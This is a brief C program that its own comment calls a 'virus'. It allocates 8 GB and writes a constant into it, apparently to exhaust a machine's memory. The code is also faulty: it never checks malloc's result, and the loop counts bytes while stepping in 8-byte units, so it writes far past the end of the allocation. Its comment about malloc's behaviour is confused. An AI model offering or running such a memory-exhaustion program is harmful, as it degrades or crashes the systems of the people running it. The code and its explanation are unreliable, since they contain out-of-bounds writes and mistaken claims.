#include <stdlib.h>
#define COEFFICIENT (1)
int main () {
	/* if size_t (i.e. long) is 8B, malloc() allocates 8GB regardless of how much RAM you have
	 * this DUMBNESS of malloc() is what makes the virus tick.
	 */
	size_t n = (COEFFICIENT * sizeof (size_t) * 1024 * 1024 * 1024);
	size_t *ptr = (size_t *) malloc (n--);
	while (n != 0) {
		// just put in some garbage, 18 dig
		*(ptr ++) = 193848392937585938;
		n--;
	}
	return 0;
}

